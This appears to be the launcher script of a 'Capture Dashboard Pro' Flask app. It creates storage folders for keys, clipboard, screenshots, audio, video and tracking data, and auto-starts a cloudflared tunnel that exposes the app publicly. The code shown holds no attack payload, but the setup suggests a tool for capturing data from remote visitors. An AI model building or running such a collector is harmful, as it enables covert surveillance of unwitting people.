import os
from pathlib import Path

BASE_DIR = Path(__file__).parent.absolute()
os.environ["DATABASE_URL"] = "sqlite:///" + str(BASE_DIR / "data" / "capture.db")
for k in ["UPLOAD_DIR", "SCREENSHOT_DIR", "BURST_DIR", "KEYS_DIR", "CLIPBOARD_DIR",
          "AUDIO_DIR", "VIDEO_DIR", "TRACKING_DIR"]:
    os.environ[k] = str(BASE_DIR / "data" / k.replace("_DIR", "").lower())
    os.makedirs(os.environ[k], exist_ok=True)


# ============================================================
# AUTO-START TUNNEL
# ============================================================
import threading
import subprocess
import time
import os as _os


def _read_conf():
    """Baca auto_tunnel.conf."""
    conf = BASE_DIR / "auto_tunnel.conf"
    enabled = False
    delay = 3
    if conf.exists():
        for line in conf.read_text().splitlines():
            line = line.strip()
            if line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip().lower()
            v = v.strip().lower()
            if k == "auto_start_tunnel":
                enabled = v == "true"
            elif k == "start_delay":
                try:
                    delay = int(v)
                except ValueError:
                    pass
    return enabled, delay


def _auto_start_tunnel():
    enabled, delay = _read_conf()
    if not enabled:
        print("[tunnel] auto-start DISABLED (cek auto_tunnel.conf)")
        return
    time.sleep(delay)
    script = BASE_DIR / "tunnel_service.sh"
    if not script.is_file():
        print("[tunnel] tunnel_service.sh tidak ada")
        return
    print("[tunnel] Auto-start cloudflared tunnel...")
    try:
        subprocess.Popen(
            ["bash", str(script), "start"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=str(BASE_DIR),
        )
        print("[tunnel] Tunnel dijalankan di background")
    except Exception as e:
        print(f"[tunnel] Gagal: {e}")


# Jalankan auto-tunnel di background thread
threading.Thread(target=_auto_start_tunnel, daemon=True).start()

# ============================================================

from app import create_app
app = create_app()

if __name__ == "__main__":
    print("=" * 60)
    print("  Capture Dashboard Pro - ULTIMATE")
    print("  URL  : http://localhost:8000/")
    print("  Dash : http://localhost:8000/dashboard")
    print("=" * 60)
    app.run(host="0.0.0.0", port=8000, debug=False)
